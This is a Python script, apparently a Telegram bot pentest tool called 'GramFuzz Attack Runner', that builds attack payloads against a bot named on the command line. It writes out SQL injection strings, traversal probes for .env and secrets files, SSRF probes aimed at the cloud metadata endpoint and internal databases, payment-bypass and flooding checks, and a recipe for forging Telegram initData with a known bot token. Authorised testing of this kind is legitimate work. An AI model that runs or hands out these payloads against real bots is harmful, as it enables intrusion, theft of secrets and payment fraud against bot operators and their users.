#!/usr/bin/env python3
"""
GramFuzz Attack Runner — auxiliary payload engine.

Inspired by popular pentest tooling patterns (sqlmap, ffuf, nmap scripts, nuclei templates).
Generates extended attack payloads without requiring bot token or API credentials.
"""

from __future__ import annotations

import argparse
import json
import sys
import urllib.parse

# sqlmap-inspired error-based probes
SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
    "1' UNION SELECT NULL--", "admin'--", "') OR ('1'='1",
]

# ffuf-inspired path mutations for bot command handlers
FFUF_COMMANDS = [
    ".env", "config.json", "settings.yaml", "secrets.json",
    "../admin", "..\\admin", "%2e%2e/admin",
]

# nuclei-inspired misconfiguration checks
MISCONFIG_VECTORS = [
    {"id": "TG-UNAUTH-WEBHOOK", "check": "webhook accepts unauthenticated POST"},
    {"id": "TG-NO-RATE-LIMIT", "check": "no rate limiting on /start flood"},
    {"id": "TG-DEBUG-ENABLED", "check": "debug mode responds to /debug"},
    {"id": "TG-ADMIN-EXPOSED", "check": "/admin accessible without auth"},
    {"id": "TG-PAYMENT-BYPASS", "check": "payment skip via start param"},
]

# nmap-script style service probes
SERVICE_PROBES = [
    "redis://localhost:6379",
    "mongodb://localhost:27017",
    "postgresql://localhost:5432",
    "http://169.254.169.254/latest/meta-data/",
]


def generate_payloads(bot: str) -> dict:
    bot = bot.lstrip("@")
    base = f"https://t.me/{bot}"

    return {
        "module": "attack-runner",
        "version": "0.3.0",
        "target": bot,
        "sqli_payloads": [
            {"payload": p, "vector": f"{base}?start={urllib.parse.quote(p)}"}
            for p in SQLI_PAYLOADS
        ],
        "ffuf_commands": [
            {"command": f"/{c}", "note": "path traversal in command handler"}
            for c in FFUF_COMMANDS
        ],
        "misconfig_checks": MISCONFIG_VECTORS,
        "ssrf_probes": SERVICE_PROBES,
        "race_condition": {
            "test": "Send /start 100x concurrently from multiple sessions",
            "target": "rate limiter, payment handler, referral counter",
        },
        "initdata_forge_template": {
            "note": "If bot token known: forge initData with HMAC-SHA256(WebAppData, bot_token)",
            "fields_to_mutate": ["user.id", "user.username", "auth_date", "chat_type"],
        },
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="GramFuzz Attack Runner")
    parser.add_argument("--bot", required=True)
    parser.add_argument("--json", action="store_true")
    args = parser.parse_args()

    result = generate_payloads(args.bot)
    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
